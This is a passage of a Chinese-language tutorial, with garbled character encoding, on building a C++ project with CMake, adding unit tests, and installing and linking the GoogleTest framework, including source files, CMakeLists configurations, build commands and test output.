= localtime(&amp;rawtime); strftime(buffer, 80, format.c_str(), info); string str(buffer); return str;}// æ ¹æ®ç»™å®šçš„æ—¥æœŸï¼Œè®¡ç®—å®ƒæ˜¯æ˜ŸæœŸå‡ // date: æ—¥æœŸå­—ç¬¦ä¸²ï¼Œæ ¼å¼æ˜¯: 2021-12-01// è¿”å›å€¼ï¼š1, 2, 3, 4, 5, 6, 0, å…¶ä¸­ 0 è¡¨ç¤ºæ˜ŸæœŸæ—¥int DateUtil::dayOfWeek(const string &amp;date) { char c; int y, m, d; stringstream(date) &gt;&gt; y &gt;&gt; c &gt;&gt; m &gt;&gt; c &gt;&gt; d; tm t = {0, 0, 0, d, m - 1, y - 1900}; mktime(&amp;t); return t.tm_wday;}// æ ¹æ®ç»™å®šçš„æ—¥æœŸï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºå‘¨æœ«// date: æ—¥æœŸå­—ç¬¦ä¸²ï¼Œæ ¼å¼æ˜¯: 2021-12-01bool DateUtil::isWeekendDays(const string &amp;date) { int wday = dayOfWeek(date); if (wday == 6 || wday == 0) { return true; } return false;} src/main.cpp 12345678910#include &lt;iostream&gt;#include "datetime.h"using namespace std;int main() { cout &lt;&lt; DateUtil::formatCurrentTime() &lt;&lt; endl; cout &lt;&lt; DateUtil::formatCurrentTime("%Y-%m-%d") &lt;&lt; endl; return 0;} test/include/strUtil.h 1234567891011121314#pragma once#include &lt;iostream&gt;using namespace std;// å»é™¤å­—ç¬¦ä¸²ä¸¤è¾¹çš„ç©ºæ ¼void trim(string &amp;str) { if (str.empty()) { return; } str.erase(0, str.find_first_not_of(" ")); str.erase(str.find_last_not_of(" ") + 1);} test/src/main.cpp 1234567891011121314151617#include &lt;iostream&gt;#include "strUtil.h"#include "datetime.h"using namespace std;int main() { // å»é™¤å­—ç¬¦ä¸²ä¸¤è¾¹çš„ç©ºæ ¼ string str = " Hello World ! "; trim(str); cout &lt;&lt; str &lt;&lt; endl; // æ ¹æ®ç»™å®šçš„æ—¥æœŸï¼Œè®¡ç®—å®ƒæ˜¯æ˜ŸæœŸå‡  cout &lt;&lt; "wday = " &lt;&lt; DateUtil::dayOfWeek("2022-01-11") &lt;&lt; ", "; cout &lt;&lt; "isWeekendDays = " &lt;&lt; (DateUtil::isWeekendDays("2022-01-11") ? "true" : "false") &lt;&lt; endl; return 0;} å…¶ä¸­ test ç›®å½•å¯ä»¥è§†ä½œä¸ºå­é¡¹ç›®ï¼Œå’Œä¸»ç›®å½•åˆ†å¼€ç¼–è¯‘ã€‚ä¸ºäº†æ¨¡æ‹Ÿæ›´çœŸå®çš„ä¼ä¸šé¡¹ç›®å¼€å‘åœºæ™¯ï¼Œè¿™é‡Œçš„ test/src/main.cpp åŒæ—¶å¼•å…¥äº† datetime.h å’Œ strUtil.h å¤´æ–‡ä»¶ã€‚ CMake é…ç½®æ–‡ä»¶ ä¸»ç›®å½•çš„ CMakeLists.txt 12345678910111213141516171819202122232425262728293031323334cmake_minimum_required(VERSION 3.15)# é¡¹ç›®ä¿¡æ¯project(minder)# å®šä¹‰C++çš„ç‰ˆæœ¬set(CMAKE_CXX_STANDARD 11)# è¾“å‡ºè°ƒè¯•ä¿¡æ¯set(CMAKE_CXX_FLAGS "-g")# å¼€å¯æ‰€æœ‰è­¦å‘Šset(CMAKE_CXX_FLAGS "-Wall")# æŒ‡å®šæ„å»ºè¾“å‡ºçš„ç›®å½•set(PROJECT_BINARY_DIR ${PROJECT_SOURCE_DIR}/build)# å¼•å…¥ä¸»é¡¹ç›®çš„å¤´æ–‡ä»¶include_directories(${PROJECT_SOURCE_DIR}/include)# æœç´¢ä¸»é¡¹ç›®çš„æºæ–‡ä»¶aux_source_directory(${PROJECT_SOURCE_DIR}/src MAIN_SOURCES)# æŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶çš„åç§°å’Œä¸»é¡¹ç›®çš„æ‰€æœ‰æºæ–‡ä»¶add_executable(${PROJECT_NAME} ${MAIN_SOURCES})# å¯ç”¨é¡¹ç›®æµ‹è¯•enable_testing()# æ·»åŠ å­ç›®å½•ï¼ˆæµ‹è¯•é¡¹ç›®ï¼‰add_subdirectory(test)# æ·»åŠ æµ‹è¯•é¡¹ç›®çš„å¯æ‰§è¡Œæ–‡ä»¶add_test(minder_test ${PROJECT_SOURCE_DIR}/test/build/minder_test) ç‰¹åˆ«è¯´æ˜ï¼š set(CMAKE_CXX_FLAGS "-xxx")ï¼šæŒ‡å®šç¼–è¯‘å‚æ•°ï¼Œç»†åŒ–çš„è¿˜æœ‰ CMAKE_CXX_FLAGS_DEBUG å’Œ CMAKE_CXX_FLAGS_RELEASE add_subdirectory(xxx)ï¼šæ·»åŠ å­ç›®å½•ï¼ˆå­é¡¹ç›®ï¼‰ï¼Œè¦æ±‚å­ç›®å½•é‡Œå¿…é¡»æœ‰å•ç‹¬çš„ CMakeLists.txtï¼Œè¯¥æ–‡ä»¶åŒ…å«äº†å­ç›®å½•çš„ç¼–è¯‘é…ç½®ä¿¡æ¯ add_test(xxx ${PROJECT_SOURCE_DIR}/test/build/xxx)ï¼šç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æŸä¸ªå•å…ƒæµ‹è¯•çš„åç§°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¯¥å•å…ƒæµ‹è¯•çš„å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ test ç›®å½•çš„ CMakeLists.txt 12345678910111213141516171819202122232425262728cmake_minimum_required(VERSION 3.15)# é¡¹ç›®ä¿¡æ¯project(minder_test)# å®šä¹‰C++çš„ç‰ˆæœ¬set(CMAKE_CXX_STANDARD 11)# æœç´¢çˆ¶ç›®å½•ï¼ˆçˆ¶é¡¹ç›®ï¼‰çš„å¤´æ–‡ä»¶include_directories(../include)# æœç´¢çˆ¶ç›®å½•ï¼ˆçˆ¶é¡¹ç›®ï¼‰çš„æºæ–‡ä»¶aux_source_directory(../src MAIN_SOURCES)# æ’é™¤çˆ¶ç›®å½•ï¼ˆçˆ¶é¡¹ç›®ï¼‰çš„å…¥å£æºæ–‡ä»¶list(FILTER MAIN_SOURCES EXCLUDE REGEX "main.cpp")# å¼•å…¥å­é¡¹ç›®çš„å¤´æ–‡ä»¶include_directories(${PROJECT_SOURCE_DIR}/include)# æœç´¢å­é¡¹ç›®é‡Œçš„æºæ–‡ä»¶aux_source_directory(${PROJECT_SOURCE_DIR}/src TEST_SOURCES)# æŒ‡å®šæ„å»ºè¾“å‡ºçš„ç›®å½•set(PROJECT_BINARY_DIR ${PROJECT_SOURCE_DIR}/build)# æŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶çš„åç§°å’Œå•å…ƒæµ‹è¯•çš„æ‰€æœ‰æºæ–‡ä»¶add_executable(${PROJECT_NAME} ${MAIN_SOURCES} ${TEST_SOURCES}) è¿™é‡Œçš„ test ä½œä¸ºå­é¡¹ç›®ï¼Œä¸»è¦è¦ç”Ÿæˆå•å…ƒæµ‹è¯•çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ å‘½ä»¤è¡Œç¼–è¯‘é¡¹ç›® ç¼–è¯‘ test å­é¡¹ç›® 1234567891011121314151617# è¿›å…¥å­é¡¹ç›®çš„ç›®å½•$ cd minder-test/test# åˆ›å»ºå­é¡¹ç›®çš„æ„å»ºç›®å½•$ mkdir build# è¿›å…¥å­é¡¹ç›®çš„æ„å»ºç›®å½•$ cd build# æ„å»ºå­é¡¹ç›®$ cmake ..# ç¼–è¯‘å­é¡¹ç›®$ make# è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶$ ./minder_test ç¼–è¯‘ä¸»é¡¹ç›® 1234567891011121314151617181920# è¿›å…¥ä¸»é¡¹ç›®çš„ç›®å½•$ cd minder-test# åˆ›å»ºä¸»é¡¹ç›®çš„æ„å»ºç›®å½•$ mkdir build# è¿›å…¥ä¸»é¡¹ç›®çš„æ„å»ºç›®å½•$ cd build# æ„å»ºä¸»é¡¹ç›®$ cmake ..# ç¼–è¯‘ä¸»é¡¹ç›®$ make# æ‰§è¡Œé¡¹ç›®æµ‹è¯•$ make test# è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶$ ./minder CMake ä½¿ç”¨ GoogleTest æµ‹è¯•æ¡†æ¶ç›¸å…³ç«™ç‚¹ GoogleTest å®˜æ–¹æ–‡æ¡£ GoogleTest GitHub ä»“åº“ GoogleTest å®˜æ–¹ä¸‹è½½é¡µé¢ GoogleTest çš„å®‰è£…GoogleTest ç¼–è¯‘å®‰è£…æ³¨æ„äº‹é¡¹ GoogleTest æœ€æ–°ç‰ˆï¼ˆ1.11.0ï¼‰è¦æ±‚ä½¿ç”¨ GCC 5.0+ å’Œ Clang 5.0+ï¼Œè‹¥ GCC çš„ç‰ˆæœ¬æ¯”è¾ƒä½ï¼Œå»ºè®®å®‰è£… GoogleTest 1.10.0 æˆ–è€… 1.8.1 ç‰ˆæœ¬ å®æµ‹ GCC 4.8.5 å¯ä»¥æ­£å¸¸ä½¿ç”¨ GoogleTest çš„ 1.10.0 ç‰ˆæœ¬ï¼Œä¸å…¼å®¹ 1.11.0 ç‰ˆæœ¬ 1234567891011121314151617181920212223# ä¸‹è½½æ–‡ä»¶$ wget https://github.com/google/googletest/archive/refs/tags/release-1.11.0.tar.gz# è§£å‹æ–‡ä»¶$ tar -xvf release-1.11.0.tar.gz# è¿›å…¥è§£å‹ç›®å½•$ cd googletest-release-1.11.0# åˆ›å»ºæ„å»ºç›®å½•$ mkdir build# è¿›å…¥æ„å»ºç›®å½•$ cd build# ç”Ÿæˆmakefileï¼Œå¦‚æœéœ€è¦æ„å»ºå¾—åˆ°åŠ¨æ€é“¾æ¥åº“ï¼Œåˆ™å¿…é¡»æ·»åŠ å‚æ•° "-DBUILD_SHARED_LIBS=ON"ï¼Œå¦åˆ™é»˜è®¤åªä¼šå¾—åˆ°é™æ€åº“ï¼ˆ.aï¼‰$ cmake -DBUILD_SHARED_LIBS=ON -Dgtest_build_samples=ON ..# ç¼–è¯‘$ make -j4# å®‰è£…$ make install å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå®‰è£…å‘½ä»¤æ‰§è¡Œå®Œæˆåï¼Œä¼šè‡ªåŠ¨å°† libgmock_main.so ã€libgmock.soã€libgtest_main.soã€libgtest.so åº“æ–‡ä»¶æ‹·è´åˆ° /usr/local/lib64/ ç›®å½•ä¸‹ã€‚GoogleTest çš„å¤´æ–‡ä»¶åˆ™ä¼šå®‰è£…åœ¨ /usr/local/include/gmock å’Œ /usr/local/include/gtest/ ç›®å½•ã€‚ GoogleTest éªŒè¯å®‰è£… åˆ›å»º C++ æºæ–‡ä»¶ test.cpp 123456789101112131415#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;gtest/gtest.h&gt;TEST( COutputPopLimitStrategyTest, PositiveNos ){ EXPECT_EQ(true, true);}int main( int argc, char *argv[] ){ ::testing::InitGoogleTest( &amp;argc, argv ); return(RUN_ALL_TESTS() );} ä½¿ç”¨ G++ å‘½ä»¤ç¼–è¯‘ C++ æºæ–‡ä»¶ 12345678910111213141516# ç¼–è¯‘æºæ–‡ä»¶$ g++ -std=c++11 test.cpp -lpthread /usr/local/lib64/libgtest.so -o test# è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼Œè‹¥è¾“å‡ºä»¥ä¸‹çš„æ—¥å¿—ä¿¡æ¯ï¼Œåˆ™è¯´æ˜GoogleTestå®‰è£…æˆåŠŸ$ ./test[==========] Running 1 test from 1 test suite.[----------] Global test environment set-up.[----------] 1 test from COutputPopLimitStrategyTest[ RUN ] COutputPopLimitStrategyTest.PositiveNos[ OK ] COutputPopLimitStrategyTest.PositiveNos (0 ms)[----------] 1 test from COutputPopLimitStrategyTest (1 ms total)[----------] Global test environment tear-down[==========] 1 test from 1 test suite ran. (1 ms total)[ PASSED ] 1 test. G++ ç¼–è¯‘å‚æ•°è¯´æ˜ï¼š -std=c++11ï¼šæŒ‡å®š C++ çš„ç‰ˆæœ¬ /usr/local/lib64/libgtest.soï¼šé“¾æ¥ GoogleTest çš„åŠ¨æ€é“¾æ¥åº“ -lpthreadï¼šç”±äº GoogleTest çš„å†…éƒ¨ä½¿ç”¨äº†å¤šçº¿ç¨‹ï¼Œå› æ­¤éœ€è¦é“¾æ¥ pthread åº“ Google Test çš„ä½¿ç”¨æ¡ˆä¾‹åˆ›å»ºé¡¹ç›®å·¥ç¨‹ä¸‹è½½ä»£ç  ç‚¹å‡»ä¸‹è½½ å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ï¼Œé¡¹ç›®çš„ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š 12345678910111213minder-gtestâ”œâ”€â”€ CMakeLists.txtâ”œâ”€â”€ includeâ”‚ â””â”€â”€ datetime.hâ”œâ”€â”€ srcâ”‚ â”œâ”€â”€ datetime.cppâ”‚ â””â”€â”€ main.cppâ””â”€â”€ test â”œâ”€â”€ CMakeLists.txt â”œâ”€â”€ include â”‚ â””â”€â”€ strUtil.h â””â”€â”€ src â””â”€â”€ main.cpp ç¼–å†™é¡¹ç›®ä»£ç ä¸‹è½½ä»£ç  è¿™é‡Œçš„ C++ ä»£ç ï¼Œé™¤äº† main.cpp çš„ä»£ç ä¸ä¸€æ ·ä¹‹å¤–ï¼Œå…¶ä»–ä»£ç ä¸ä¸Šé¢çš„æ¡ˆä¾‹ä»£ç å®Œå…¨ä¸€è‡´ï¼Œä¸å†ç´¯è¿°ã€‚ 1234567891011121314151617181920212223#include &lt;iostream&gt;#include "strUtil.h"#include "datetime.h"#include &lt;gtest/gtest.h&gt;using namespace std;// å»é™¤å­—ç¬¦ä¸²ä¸¤è¾¹çš„ç©ºæ ¼TEST(TestCase, test1) { string str = " Hello World ! "; trim(str); ASSERT_EQ("Hello World !", str);}// æ ¹æ®ç»™å®šçš„æ—¥æœŸï¼Œè®¡ç®—å®ƒæ˜¯æ˜ŸæœŸå‡ TEST(TestCase, test2) { ASSERT_EQ(true, DateUtil::isWeekendDays("2022-01-09"));}int main(int argc, char **argv) { testing::InitGoogleTest(&amp;argc, argv); return RUN_ALL_TESTS();} CMake é…ç½®æ–‡ä»¶ ä¸»ç›®å½•çš„ CMakeLists.txtï¼Œè¿™é‡Œçš„é…ç½®å†…å®¹ä¸ä¸Šé¢çš„æ¡ˆä¾‹æ²¡æœ‰ä»»ä½•åŒºåˆ« 12345678910111213141516171819202122232425262728293031323334cmake_minimum_required(VERSION 3.15)# é¡¹ç›®ä¿¡æ¯project(minder)# å®šä¹‰C++çš„ç‰ˆæœ¬set(CMAKE_CXX_STANDARD 11)# è¾“å‡ºè°ƒè¯•ä¿¡æ¯set(CMAKE_CXX_FLAGS "-g")# å¼€å¯æ‰€æœ‰è­¦å‘Šset(CMAKE_CXX_FLAGS "-Wall")# æŒ‡å®šæ„å»ºè¾“å‡ºçš„ç›®å½•set(PROJECT_BINARY_DIR ${PROJECT_SOURCE_DIR}/build)# å¼•å…¥ä¸»é¡¹ç›®çš„å¤´æ–‡ä»¶include_directories(${PROJECT_SOURCE_DIR}/include)# æœç´¢ä¸»é¡¹ç›®çš„æºæ–‡ä»¶aux_source_directory(${PROJECT_SOURCE_DIR}/src MAIN_SOURCES)# æŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶çš„åç§°å’Œä¸»é¡¹ç›®çš„æ‰€æœ‰æºæ–‡ä»¶add_executable(${PROJECT_NAME} ${MAIN_SOURCES})# å¯ç”¨å•å…ƒæµ‹è¯•enable_testing()# æ·»åŠ å­ç›®å½•ï¼ˆå­é¡¹ç›®ï¼‰add_subdirectory(test)# æ·»åŠ å•å…ƒæµ‹è¯•çš„å¯æ‰§è¡Œæ–‡ä»¶add_test(minder_test ${PROJECT_SOURCE_DIR}/test/build/minder_test) test ç›®å½•çš„ CMakeLists.txtï¼Œè¿™é‡Œçš„é…ç½®å†…å®¹æ–°å¢äº† GoogleTest åº“ 1234567891011121314151617181920212223242526272829303132333435363738394041cmake_minimum_required(VERSION 3.15)# é¡¹ç›®ä¿¡æ¯project(minder_test)# å®šä¹‰C++çš„ç‰ˆæœ¬set(CMAKE_CXX_STANDARD 11)# æŸ¥æ‰¾ GoogleTest åº“find_package(GTest REQUIRED)# æ˜¾ç¤º GoogleTest åº“çš„è·¯å¾„MESSAGE(STATUS "GTEST_INCLUDE_DIRS : " ${GTEST_INCLUDE_DIRS})MESSAGE(STATUS "GTEST_BOTH_LIBRARIES : " ${GTEST_BOTH_LIBRARIES})# æœç´¢çˆ¶ç›®å½•ï¼ˆçˆ¶é¡¹ç›®ï¼‰çš„å¤´æ–‡ä»¶include_directories(../include)# æœç´¢çˆ¶ç›®å½•ï¼ˆçˆ¶é¡¹ç›®ï¼‰çš„æºæ–‡ä»¶aux_source_directory(../src MAIN_SOURCES)# æ’é™¤çˆ¶ç›®å½•ï¼ˆçˆ¶é¡¹ç›®ï¼‰çš„å…¥å£æºæ–‡ä»¶list(FILTER MAIN_SOURCES EXCLUDE REGEX "main.cpp")# å¼•å…¥å­é¡¹ç›®çš„å¤´æ–‡ä»¶include_directories(${PROJECT_SOURCE_DIR}/include)# æœç´¢å­é¡¹ç›®é‡Œçš„æºæ–‡ä»¶aux_source_directory(${PROJECT_SOURCE_DIR}/src TEST_SOURCES)# å¼•å…¥ GoogleTest çš„å¤´æ–‡ä»¶include_directories(${GTEST_INCLUDE_DIRS})# æŒ‡å®šæ„å»ºè¾“å‡ºçš„ç›®å½•set(PROJECT_BINARY_DIR ${PROJECT_SOURCE_DIR}/build)# æŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶çš„åç§°å’Œå•å…ƒæµ‹è¯•çš„æ‰€æœ‰æºæ–‡ä»¶add_executable(${PROJECT_NAME} ${MAIN_SOURCES} ${TEST_SOURCES})# é“¾æ¥ GoogleTest ä¸ pthread åº“ï¼ˆè¯·ç‰¹åˆ«æ³¨æ„å£°æ˜çš„é¡ºåºï¼‰target_link_libraries(${PROJECT_NAME} ${GTEST_BOTH_LIBRARIES} pthread) å‘½ä»¤è¡Œç¼–è¯‘é¡¹ç›® ç¼–è¯‘ test å­é¡¹ç›® 1234567891011121314151617# è¿›å…¥å­é¡¹ç›®çš„ç›®å½•$ cd minder-gtest/test# åˆ›å»ºå­é¡¹ç›®çš„æ„å»ºç›®å½•$ mkdir build# è¿›å…¥å­é¡¹ç›®çš„æ„å»ºç›®å½•$ cd build# æ„å»ºå­é¡¹ç›®$ cmake ..# ç¼–è¯‘å­é¡¹ç›®$ make# è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶$ ./minder_test è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶åï¼Œè¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯å¦‚ä¸‹ï¼š 123456789101112[==========] Running 2 tests from 1 test suite.[----------] Global test environment set-up.[----------] 2 tests from TestCase[ RUN ] TestCase.test1[ OK ] TestCase.test1 (0 ms)[ RUN ] TestCase.test2[ OK ] TestCase.test2 (0 ms)[----------] 2 tests from TestCase (0 ms total)[----------] Global test environment tear-down[==========] 2 tests from 1 test suite ran. (2 ms total)[ PASSED ] 2 tests. ç¼–è¯‘ä¸»é¡¹ç›® 1234567891011121314151617181920# è¿›å…¥ä¸»é¡¹ç›®çš„ç›®å½•$ cd minder-gtest# åˆ›å»ºä¸»é¡¹ç›®çš„æ„å»ºç›®å½•$ mkdir build# è¿›å…¥ä¸»é¡¹ç›®çš„æ„å»ºç›®å½•$ cd build# æ„å»ºä¸»é¡¹ç›®$ cmake ..# ç¼–è¯‘ä¸»é¡¹ç›®$ make# æ‰§è¡Œé¡¹ç›®æµ‹è¯•$ make test# è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶$ ./minder GoogleTest ä½¿ç”¨æ‰©å±•è¯´æ˜åœ¨ä¸Šé¢çš„æ¡ˆä¾‹ä¸­ï¼ŒGoogleTest æ˜¯ä½¿ç”¨æºç ç¼–è¯‘çš„æ–¹å¼å®‰è£…åˆ° Linux ç³»ç»Ÿä¸Šçš„ï¼Œè¿™åœ¨è¿ç§»æ“ä½œç³»ç»Ÿçš„æ—¶å€™ï¼Œéœ€è¦é‡å¤æ‰§è¡ŒåŒæ ·çš„å®‰è£…æ­¥éª¤ã€‚æ­¤æ—¶ä¸ºäº†æ–¹ä¾¿æ—¥åè¿ç§»æ“ä½œç³»ç»Ÿï¼Œå¯ä»¥å°† GoogleTest çš„å¤´æ–‡ä»¶ã€åŠ¨æ€é“¾æ¥éƒ½å¤åˆ¶ä¸€ä»½åˆ°é¡¹ç›®ä¸­ï¼Œè¿™æ ·å°±å¯ä»¥ä¸ä¾èµ–å¤–éƒ¨çš„ç³»ç»Ÿç¯å¢ƒäº†ã€‚ æç¤º ç‚¹å‡»ä¸‹è½½ å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ï¼Œé¡¹ç›®çš„ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778minder-gtest-plusâ”œâ”€â”€ CMakeLists.txtâ”œâ”€â”€ includeâ”‚ â””â”€â”€ datetime.hâ”œâ”€â”€ srcâ”‚ â”œâ”€â”€ datetime.cppâ”‚ â””â”€â”€ main.cppâ”œâ”€â”€ testâ”‚ â”œâ”€â”€ CMakeLists.txtâ”‚ â”œâ”€â”€ includeâ”‚ â”‚ â””â”€â”€ strUtil.hâ”‚ â””â”€â”€ srcâ”‚ â””â”€â”€ main.cppâ””â”€â”€ thirdparty â””â”€â”€ googletest â”œâ”€â”€ gmock â”‚ â”œâ”€â”€ include â”‚ â”‚ â””â”€â”€ gmock â”‚ â”‚ â”œâ”€â”€ gmock-actions.h â”‚ â”‚ â”œâ”€â”€ gmock-cardinalities.h â”‚ â”‚ â”œâ”€â”€ gmock-function-mocker.h â”‚ â”‚ â”œâ”€â”€ gmock-generated-actions.h â”‚ â”‚ â”œâ”€â”€ gmock-generated-actions.h.pump â”‚ â”‚ â”œâ”€â”€ gmock-generated-function-mockers.h â”‚ â”‚ â”œâ”€â”€ gmock-generated-function-mockers.h.pump â”‚ â”‚ â”œâ”€â”€ gmock-generated-matchers.h â”‚ â”‚ â”œâ”€â”€ gmock-generated-matchers.h.pump â”‚ â”‚ â”œâ”€â”€ gmock.h â”‚ â”‚ â”œâ”€â”€ gmock-matchers.h â”‚ â”‚ â”œâ”€â”€ gmock-more-actions.h â”‚ â”‚ â”œâ”€â”€ gmock-more-matchers.h â”‚ â”‚ â”œâ”€â”€ gmock-nice-strict.h â”‚ â”‚ â”œâ”€â”€ gmock-spec-builders.h â”‚ â”‚ â””â”€â”€ internal â”‚ â”‚ â”œâ”€â”€ custom â”‚ â”‚ â”‚ â”œâ”€â”€ gmock-generated-actions.h â”‚ â”‚ â”‚ â”œâ”€â”€ gmock-generated-actions.h.pump â”‚ â”‚ â”‚ â”œâ”€â”€ gmock-matchers.h â”‚ â”‚ â”‚ â”œâ”€â”€ gmock-port.h â”‚ â”‚ â”‚ â””â”€â”€ README.md â”‚ â”‚ â”œâ”€â”€ gmock-internal-utils.h â”‚ â”‚ â”œâ”€â”€ gmock-port.h â”‚ â”‚ â””â”€â”€ gmock-pp.h â”‚ â””â”€â”€ lib â”‚ â”œâ”€â”€ libgmock_main.so â”‚ â””â”€â”€ libgmock.so â””â”€â”€ gtest â”œâ”€â”€ include â”‚ â””â”€â”€ gtest â”‚ â”œâ”€â”€ gtest-death-test.h â”‚ â”œâ”€â”€ gtest.h â”‚ â”œâ”€â”€ gtest-matchers.h â”‚ â”œâ”€â”€ gtest-message.h â”‚ â”œâ”€â”€ gtest-param-test.h â”‚ â”œâ”€â”€ gtest_pred_impl.h â”‚ â”œâ”€â”€ gtest-printers.h â”‚ â”œâ”€â”€ gtest_prod.h â”‚ â”œâ”€â”€ gtest-spi.h â”‚ â”œâ”€â”€ gtest-test-part.h â”‚ â”œâ”€â”€ gtest-typed-test.h â”‚ â””â”€â”€ internal â”‚ â”œâ”€â”€ custom â”‚ â”‚ â”œâ”€â”€ gtest.h â”‚ â”‚ â”œâ”€â”€ gtest-port.h â”‚ â”‚ â”œâ”€â”€ gtest-printers.h â”‚ â”‚ â””â”€â”€ README.md â”‚ â”œâ”€â”€ gtest-death-test-internal.h â”‚ â”œâ”€â”€ gtest-filepath.h â”‚ â”œâ”€â”€ gtest-internal.h â”‚ â”œâ”€â”€ gtest-param-util.h â”‚ â”œâ”€â”€ gtest-port-arch.h â”‚ â”œâ”€â”€ gtest-port.h â”‚ â”œâ”€â”€ gtest-string.h â”‚ â”œâ”€â”€ gtest-type-util.h â”‚ â””â”€â”€ gtest-type-util.h.pump â””â”€â”€ lib â”œâ”€â”€ libgtest_main.so â””â”€â”€ libgtest.so test ç›®å½•çš„ CMakeLists.txtï¼Œè¿™é‡Œçš„é…ç½®å†…å®¹ä½¿ç”¨äº†é¡¹ç›®é‡Œçš„ GoogleTest åº“ 1234567891011121314151617181920212223242526272829303132333435363738394041cmake_minimum_required(VERSION 3.15)# å®šä¹‰ GoogleTest åº“çš„ç›®å½•è·¯å¾„set(PATH_TO_GOOGLE_TEST ../thirdparty/googletest/gtest)set(PATH_TO_GOOGLE_MOCK ../thirdparty/googletest/gmock)# é¡¹ç›®ä¿¡æ¯project(minder_test)# å®šä¹‰C++çš„ç‰ˆæœ¬set(CMAKE_CXX_STANDARD 11)# æœç´¢çˆ¶ç›®å½•ï¼ˆçˆ¶é¡¹ç›®ï¼‰çš„å¤´æ–‡ä»¶include_directories(../include)# æœç´¢çˆ¶ç›®å½•ï¼ˆçˆ¶é¡¹ç›®ï¼‰çš„æºæ–‡ä»¶aux_source_directory(../src MAIN_SOURCES)# æ’é™¤çˆ¶ç›®å½•ï¼ˆçˆ¶é¡¹ç›®ï¼‰çš„å…¥å£æºæ–‡ä»¶list(FILTER MAIN_SOURCES EXCLUDE REGEX "main.cpp")# å¼•å…¥å­é¡¹ç›®çš„å¤´æ–‡ä»¶include_directories(${PROJECT_SOURCE_DIR}/include)# æœç´¢å­é¡¹ç›®é‡Œçš„æºæ–‡ä»¶aux_source_directory(${PROJECT_SOURCE_DIR}/src TEST_SOURCES)# å¼•å…¥ GoogleTest åº“çš„å¤´æ–‡ä»¶include_directories(${PATH_TO_GOOGLE_TEST}/include ${PATH_TO_GOOGLE_MOCK}/include)# æŒ‡å®š GoogleTest åŠ¨æ€é“¾æ¥åº“æ‰€åœ¨çš„ç›®å½•link_directories(${PATH_TO_GOOGLE_TEST}/lib ${PATH_TO_GOOGLE_MOCK}/lib)# æŒ‡å®šæ„å»ºè¾“å‡ºçš„ç›®å½•set(PROJECT_BINARY_DIR ${PROJECT_SOURCE_DIR}/build)# æŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶çš„åç§°å’Œå•å…ƒæµ‹è¯•çš„æ‰€æœ‰æºæ–‡ä»¶add_executable(${PROJECT_NAME} ${MAIN_SOURCES} ${TEST_SOURCES})# é“¾æ¥ GoogleTest ä¸ pthread åº“ï¼ˆè¯·ç‰¹åˆ«æ³¨æ„å£°æ˜çš„é¡ºåºï¼‰target_link_libraries(${PROJECT_NAME} gtest_main.so gtest.so gmock_main.so gmock.so pthread) main.cpp çš„ C++ ä»£ç ï¼Œä¸ä¸Šé¢çš„æ¡ˆä¾‹ä»£ç å®Œå…¨ä¸€è‡´ 1234567891011121314151617181920212223#include &lt;iostream&gt;#include "strUtil.h"#include "datetime.h"#include &lt;gtest/gtest.h&gt;using namespace std;// å»é™¤å­—ç¬¦ä¸²ä¸¤è¾¹çš„ç©ºæ ¼TEST(TestCase, test1) { string str = " Hello World ! "; trim(str); ASSERT_EQ("Hello World !", str);}// æ ¹æ®ç»™å®šçš„æ—¥æœŸï¼Œè®¡ç®—å®ƒæ˜¯æ˜ŸæœŸå‡ TEST(TestCase, test2) { ASSERT_EQ(true, DateUtil::isWeekendDays("2022-01-09"));}int main(int argc, char **argv) { testing::InitGoogleTest(&amp;argc, argv); return RUN_ALL_TESTS();} å‚è€ƒåšå®¢ å»ºç«‹ç®€å•çš„å¸¦å•å…ƒæµ‹è¯•çš„ CMake é¡¹ç›® CMake + GoogleTest ä¹‹ä¸€å…¥é—¨ CMake ä½¿ç”¨ GoogleTest è¿›è¡Œå•å…ƒæµ‹è¯• Centos7 C++ å®‰è£…ä½¿ç”¨ GoogleTest è¿›è¡Œå•å…ƒæµ‹è¯• var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ linuxç³»ç»Ÿç¼–ç¨‹ cè¯­è¨€"},{title:"Debian å®‰è£… GCCã€G++ã€GDB",url:"/posts/7df04100.html",text:'æç¤º GCC 4.8.1ï¼Œè¿™æ˜¯è¯¥ç¼–è¯‘å™¨ç”± C å®ç°è½¬å‘ C++ å®ç°ï¼ˆ4.8 ç‰ˆæœ¬ï¼‰åçš„é¦–æ¬¡å‡çº§ï¼Œä¹Ÿæ˜¯ç¬¬ä¸€ä¸ªå®ç° C++ 11 